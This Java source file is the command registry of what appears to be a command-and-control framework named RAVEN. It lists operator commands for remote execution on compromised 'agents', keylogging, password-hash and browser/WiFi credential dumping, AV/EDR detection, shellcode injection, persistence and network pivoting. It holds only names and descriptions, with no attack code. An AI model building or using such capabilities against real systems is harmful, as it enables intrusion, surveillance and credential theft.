package com.raven.core.command;

import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.stream.Collectors;

public final class CommandRegistry {

    public enum Category {
        SYSTEM,
        SERVER,
        SESSION,
        RECON,
        FILESYSTEM,
        TASK,
        LATERAL,
        OPERATOR,
        CHAT,
        EXPORT,
        PROFILE,
        WEB
    }

    public record CommandDef(String Name, String Usage, String Description, Category Category, boolean RequireTeamMode) {}

    private static final Map<String, CommandDef> REGISTRY = new LinkedHashMap<>();

    static {
        Register("help", "help", "Show this command reference", Category.SYSTEM, false);
        Register("clear", "clear", "Clear operator terminal (local only — does NOT send to agent)", Category.SYSTEM, false);
        Register("exit", "exit", "Shutdown server and exit", Category.SYSTEM, false);
        Register("quit", "quit", "Alias for exit", Category.SYSTEM, false);

        Register("status", "status", "Show server mode, uptime, and database status", Category.SERVER, false);
        Register("logs", "logs", "Show recent server event logs", Category.SERVER, false);

        Register("sessions", "sessions", "List all active agent sessions", Category.SESSION, false);
        Register("agents", "agents", "Alias for sessions", Category.SESSION, false);
        Register("stats", "stats", "Show session type statistics", Category.SESSION, false);
        Register("use", "use <id>", "Enter interactive shell with agent", Category.SESSION, false);
        Register("sysinfo", "sysinfo <id>", "Show full system info for agent", Category.SESSION, false);
        Register("info", "info <id>", "Alias for sysinfo", Category.SESSION, false);
        Register("exec", "exec <id> <command>", "Execute arbitrary command on agent (raw passthrough)", Category.SESSION, false);
        Register("shell", "shell <id> <command>", "Execute via shell interpreter (auto: sh -c / cmd /c)", Category.SESSION, false);
        Register("broadcast", "broadcast <id,id,...|all> <command>", "Broadcast command to selected or all agents", Category.SESSION, false);
        Register("kill", "kill <id>", "Terminate an agent session", Category.SESSION, false);
        Register("ping", "ping <id>", "Ping agent to verify liveness (raven: protocol)", Category.SESSION, false);
        Register("reconnect", "reconnect <id>", "Ask RAVEN agent to reconnect (raven: protocol only)", Category.SESSION, false);
        Register("self-destruct", "self-destruct <id>", "Wipe agent and terminate session (ADMIN+)", Category.SESSION, false);
        Register("sleep", "sleep <id> <seconds>", "Set agent sleep interval (raven: protocol)", Category.SESSION, false);
        Register("jitter", "jitter <id> <ms>", "Set agent jitter delay in ms (raven: protocol)", Category.SESSION, false);

        Register("whoami", "whoami <id>", "Current user — Linux: whoami / Windows: whoami /all", Category.RECON, false);
        Register("id", "id <id>", "User ID/groups — Linux: id / Windows: whoami /groups", Category.RECON, false);
        Register("hostname", "hostname <id>", "Show agent hostname", Category.RECON, false);
        Register("uname", "uname <id>", "OS/kernel info — Linux: uname -a / Windows: ver + systeminfo", Category.RECON, false);
        Register("ps", "ps <id>", "Process list — Linux: ps aux / Windows: tasklist /v", Category.RECON, false);
        Register("env", "env <id>", "Environment vars — Linux: env / Windows: set", Category.RECON, false);
        Register("netstat", "netstat <id>", "Network connections — Linux: ss -tulpn / Windows: netstat -an", Category.RECON, false);
        Register("ifconfig", "ifconfig <id>", "Network interfaces — Linux: ip addr / Windows: ipconfig /all", Category.RECON, false);
        Register("arp", "arp <id>", "ARP table — Linux: arp -n / Windows: arp -a", Category.RECON, false);
        Register("route", "route <id>", "Routing table — Linux: ip route / Windows: route print", Category.RECON, false);
        Register("users", "users <id>", "Local users — Linux: /etc/passwd / Windows: net user", Category.RECON, false);
        Register("groups", "groups <id>", "Groups — Linux: groups / Windows: net localgroup", Category.RECON, false);
        Register("services", "services <id>", "Running services — Linux: systemctl / Windows: sc query", Category.RECON, false);
        Register("screenshot", "screenshot <id>", "Capture desktop screenshot (raven: protocol)", Category.RECON, false);
        Register("privcheck", "privcheck <id>", "Privilege check — Linux: id+sudo -l / Windows: whoami /priv", Category.RECON, false);
        Register("antivirus", "antivirus <id>", "Detect AV/EDR — Linux: ps grep / Windows: wmic AntivirusProduct", Category.RECON, false);
        Register("crontab", "crontab <id>", "Scheduled tasks — Linux: crontab -l / Windows: schtasks /query", Category.RECON, false);
        Register("clipboard", "clipboard <id>", "Read clipboard — Linux: xclip/xsel / Windows: PowerShell", Category.RECON, false);
        Register("keystroke", "keystroke <id> <on|off>", "Toggle keylogger on agent (raven: protocol)", Category.RECON, false);
        Register("hashdump", "hashdump <id>", "Dump hashes — Linux: /etc/shadow / Windows: SAM (raven: protocol)", Category.RECON, false);
        Register("searchfiles", "searchfiles <id> <pattern>", "File search — Linux: find / Windows: where /r", Category.RECON, false);
        Register("wifidump", "wifidump <id>", "WiFi creds — Linux: nmcli / Windows: netsh wlan", Category.RECON, false);
        Register("dumpbrowsers", "dumpbrowsers <id>", "Saved browser credentials (raven: protocol)", Category.RECON, false);
        Register("lastlog", "lastlog <id>", "Recent logins — Linux: last -n 20 / Windows: net user + wevtutil", Category.RECON, false);
        Register("osquery", "osquery <id> <sql>", "Run osquery SQL on agent (requires osquery installed)", Category.RECON, false);

        Register("ls", "ls <id> [path]", "List directory — Linux: ls -la / Windows: dir", Category.FILESYSTEM, false);
        Register("pwd", "pwd <id>", "Working directory — Linux: pwd / Windows: cd", Category.FILESYSTEM, false);
        Register("cd", "cd <id> <path>", "Change directory on agent", Category.FILESYSTEM, false);
        Register("cat", "cat <id> <file>", "Read file — Linux: cat / Windows: type", Category.FILESYSTEM, false);
        Register("head", "head <id> <file> [n]", "First N lines — Linux: head -n / Windows: (PowerShell Get-Content -Head)", Category.FILESYSTEM, false);
        Register("tail", "tail <id> <file> [n]", "Last N lines — Linux: tail -n / Windows: (PowerShell Get-Content -Tail)", Category.FILESYSTEM, false);
        Register("rm", "rm <id> <path>", "Delete file/dir — Linux: rm -rf / Windows: del/rmdir", Category.FILESYSTEM, false);
        Register("mkdir", "mkdir <id> <path>", "Create directory — Linux: mkdir -p / Windows: mkdir", Category.FILESYSTEM, false);
        Register("cp", "cp <id> <src> <dst>", "Copy — Linux: cp -r / Windows: copy", Category.FILESYSTEM, false);
        Register("mv", "mv <id> <src> <dst>", "Move — Linux: mv / Windows: move", Category.FILESYSTEM, false);
        Register("chmod", "chmod <id> <mode> <file>", "Permissions — Linux: chmod / Windows: icacls (best-effort)", Category.FILESYSTEM, false);
        Register("find", "find <id> <path> [name]", "Find files — Linux: find / Windows: where /r", Category.FILESYSTEM, false);
        Register("grep", "grep <id> <pattern> <file>", "Search text — Linux: grep -n / Windows: findstr", Category.FILESYSTEM, false);
        Register("hash", "hash <id> <file> [sha256|md5]", "File hash — Linux: sha256sum/md5sum / Windows: certutil", Category.FILESYSTEM, false);
        Register("download", "download <id> <remote-path>", "Download file from agent (raven: protocol)", Category.FILESYSTEM, false);
        Register("upload", "upload <id> <local-path> [remote-path]", "Upload file to agent (raven: protocol)", Category.FILESYSTEM, false);

        Register("tasks", "tasks", "Show pending task queue", Category.TASK, false);
        Register("history", "history [id] [limit]", "Command history (all agents or specific)", Category.TASK, false);
        Register("sesshistory", "sesshistory [limit]", "Session connection history from database", Category.TASK, false);
        Register("note", "note <id> <text>", "Set note for an agent", Category.TASK, false);
        Register("getnote", "getnote <id>", "Get note for an agent", Category.TASK, false);

        Register("pivot", "pivot <id> <host:port>", "Register pivot route through agent (raven: protocol)", Category.LATERAL, false);
        Register("portfwd", "portfwd <id> <lport> <rhost> <rport>", "Port forward through agent (raven: protocol)", Category.LATERAL, false);
        Register("socks", "socks <id> <lport>", "SOCKS5 proxy through agent (raven: protocol)", Category.LATERAL, false);
        Register("spawn", "spawn <id>", "Spawn new agent process on target (raven: protocol)", Category.LATERAL, false);
        Register("shellcode", "shellcode <id> <hex>", "Inject shellcode — Linux: ptrace / Windows: VirtualAllocEx", Category.LATERAL, false);
        Register("persist", "persist <id> [method]", "Install persistence — Linux: cron/bashrc/systemd / Windows: reg/schtask", Category.LATERAL, false);
        Register("unpersist", "unpersist <id> [method]", "Remove persistence entry (raven: protocol)", Category.LATERAL, false);
        Register("runas", "runas <id> <user> <pass> <cmd>", "Run as user — Linux: su / Windows: runas", Category.LATERAL, false);

        Register("listopt", "listopt", "List all operators and their roles", Category.OPERATOR, false);
        Register("addopt", "addopt <user> <pass> [SUPER|ADMIN|OPERATOR|MEMBER]", "Add a new operator account", Category.OPERATOR, false);
        Register("delopt", "delopt <username>", "Delete an operator account", Category.OPERATOR, false);
        Register("kick", "kick <username>", "Kick and remove operator token (SUPER only)", Category.OPERATOR, false);
        Register("setrole", "setrole <user> <SUPER|ADMIN|OPERATOR|MEMBER>", "Change operator role", Category.OPERATOR, false);
        Register("passwd", "passwd <user> <newpass>", "Change operator password", Category.OPERATOR, false);

        Register("chat", "chat", "Show in-memory chat messages", Category.CHAT, false);
        Register("chathistory", "chathistory [limit]", "Show chat history from database", Category.CHAT, false);
        Register("ch", "ch <recipient> <message>", "Send direct message to operator", Category.CHAT, true);
        Register("gc", "gc <all|name,...> <message>", "Send group or broadcast chat message", Category.CHAT, true);

        Register("export", "export <target> <format>", "Export data  |  targets: all, logs, chat, history, sessions, operators, notes  |  formats: txt, json", Category.EXPORT, false);

        Register("profiles", "profiles", "List all saved operator profiles", Category.PROFILE, false);
        Register("profile", "profile [name]", "Show active profile or details of a named profile", Category.PROFILE, false);
        Register("loadprofile", "loadprofile <name>", "Load and apply a profile to current session", Category.PROFILE, false);
        Register("saveprofile", "saveprofile <name> [description]", "Save current session settings as a new profile", Category.PROFILE, false);
        Register("delprofile", "delprofile <name>", "Delete a saved profile (cannot delete 'default')", Category.PROFILE, false);
        Register("cloneprofile", "cloneprofile <source> <target>", "Clone an existing profile under a new name", Category.PROFILE, false);
        Register("editprofile", "editprofile <name> <key> <value>", "Set a single key in a saved profile", Category.PROFILE, false);

        Register("webstart", "webstart [host] [port]", "Start the web panel server", Category.WEB, false);
        Register("webstop", "webstop", "Stop the web panel server", Category.WEB, false);
        Register("webstatus", "webstatus", "Show web panel current status", Category.WEB, false);
    }

    private static void Register(String Name, String Usage, String Description, Category Category, boolean RequireTeamMode) {
        REGISTRY.put(Name, new CommandDef(Name, Usage, Description, Category, RequireTeamMode));
    }

    public static CommandDef Get(String Name) {
        return REGISTRY.get(Name.toLowerCase());
    }

    public static boolean Has(String Name) {
        return REGISTRY.containsKey(Name.toLowerCase());
    }

    public static Map<String, CommandDef> All() {
        return Collections.unmodifiableMap(REGISTRY);
    }

    public static List<CommandDef> ByCategory(Category Category) {
        return REGISTRY.values()
            .stream()
            .filter(Command -> Command.Category() == Category)
            .collect(Collectors.toList());
    }
}
